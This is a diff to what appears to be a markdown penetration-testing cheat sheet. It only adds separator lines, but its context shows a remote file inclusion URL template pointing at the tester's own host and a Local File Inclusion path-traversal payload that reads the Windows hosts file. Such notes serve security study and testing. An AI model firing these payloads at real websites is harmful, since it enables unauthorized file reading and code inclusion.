@@ -10,6 +10,8 @@ http://$url/$query?$value=//$myip/somefile
 ```
 {% endcode %}
 
+***
+
 
 
 ## <mark style="color:green;">Local File Inclusion</mark>
@@ -21,4 +23,8 @@ Also known as LFI, able to get a website to include a file that was not intended
 http://$url/$query?$value=../../../../../../WINDOWS/system32/drivers/etc/hosts #Common file for save host name and ip in windows, we use ../ to get to the root directory C:\
 ```
 {% endcode %}
+
+***
+
+
 
